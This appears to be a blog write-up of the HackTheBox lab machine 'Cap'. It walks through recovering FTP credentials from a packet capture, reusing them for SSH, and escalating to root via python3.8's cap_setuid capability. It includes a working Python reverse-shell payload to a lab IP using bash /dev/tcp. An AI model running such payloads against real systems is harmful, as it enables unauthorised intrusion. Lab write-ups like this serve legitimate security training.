---
title: Cap
date: 2026-03-10
category: [HackTheBox, Linux]
tags: [nmap, linPEAS, Wireshark]
difficulty: Easy
summary: Cap is an easy rated box on Hack The Box
---

## Reconnaissance
Running a default Nmap scan:
```
nmap -sV -vv IP
```
- `-sV`: show service and version
- `-vv`: extra verbose mode to keep track with the scanning process
![Pasted image 20260310165330](/images/Pasted%20image%2020260310165330.png)
Found 3 open ports:
- Port 21 running an FTP server with version vsftpd 3.0.3
- Port 22 running SSH 
- Port 80 is a HTTP web server (Gunicorn is a Web Server Gateway Interface)

![Pasted image 20260310165540](/images/Pasted%20image%2020260310165540.png)
Looks like it's used to monitor network. The user named Nathan.
The Ip Config Tab looks promissing:
![Pasted image 20260310170633](/images/Pasted%20image%2020260310170633.png)
Head to the Security Snapshot tab we can download a packet capture file named 0.pcap. Maybe it captures the machine's network traffic? Cause there are also two other .pcap files that captures my gobuster directory enumeration requests. Open 0.pcap in Wireshark:
![Pasted image 20260310171820](/images/Pasted%20image%2020260310171820.png)
Hmm the IP addresses here are different from the one we saw in ipconfig result. I have some pretty much networking things to ask but we might just skip it for this task. Okay scroll down a bit we see some FTP packets captured. We simply filter all FTP packets to get the result:
![Pasted image 20260310172352](/images/Pasted%20image%2020260310172352.png)
okay the one IP 192.168.196.16 seems like an FTP client trying to access the FTP server with username nathan, which then tried to download a copy of file notes.txt but failed, could it be the flag we've been finding? Let's tryna connect to the server using that credentials.
```
ftp nathan@IP
```
Specify the password and we successfully connected to FTP server.
![Pasted image 20260310172930](/images/Pasted%20image%2020260310172930.png)
- `ls` to list all the files in current folder, we saw a potential user.txt that might contain the flag
- `get user.txt` to download the file to local machine
We got the user flag.
I then tried ssh to his machine using the same credential: 
```
ssh nathan@IP
```
![Pasted image 20260310175254](/images/Pasted%20image%2020260310175254.png)
Hop straight into /etc folder I see that the shadow file has Read permission for groups, but I cannot read it.
Okay so after a while of searching for files, misconfigured permissions without finding anything useful, I decided to Head to Guided Mode for a lil more support. The last question they suggest that I should use linPEAS to scan for vulnerability files on the machine. I then download the shell script to my machine and start a http server:
![Pasted image 20260310192120](/images/Pasted%20image%2020260310192120.png)
And then go to the ssh session to curl from my http server:
![Pasted image 20260310192203](/images/Pasted%20image%2020260310192203.png)
The Guided question suggests that I should look for files with capabilities results provided by linPEAS:
![Pasted image 20260310192307](/images/Pasted%20image%2020260310192307.png)
So this python3.8 service has the cap_setuid capability, which allows a process to set its own user ID. So after a while on recapping some linux knowledge, I came up with a solution: write a python script that then run with `python3.8 script.py`, inside I can easily set its uid back to 0 (root) and then spawn a reverse shell back to my machine to get a root shell.
```python
import subprocess, os
os.setuid(0)

subprocess.run(["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.15.26/44444 0>&1"])
```
Again inside the ssh session, download the script, then I start a `nc` listener on port 44444, go back to the machine and execute the script:
```
python3.8 script.py
```
![Pasted image 20260310190242](/images/Pasted%20image%2020260310190242.png)
And I've got the root shell.
## Summary
- This machine shows how unencrypted traffic could leaks your credentials (in this case is FTP).
- It's clearly that the user is vulnerable to password reuse that gives me the initial foothold to the machine.
- New tool linPEAS learned, this could be my last resort for when my enumeration cannot resolve anything.
![Pasted image 20260310193020](/images/Pasted%20image%2020260310193020.png)
Pretty nice number so I'm gonna save it here.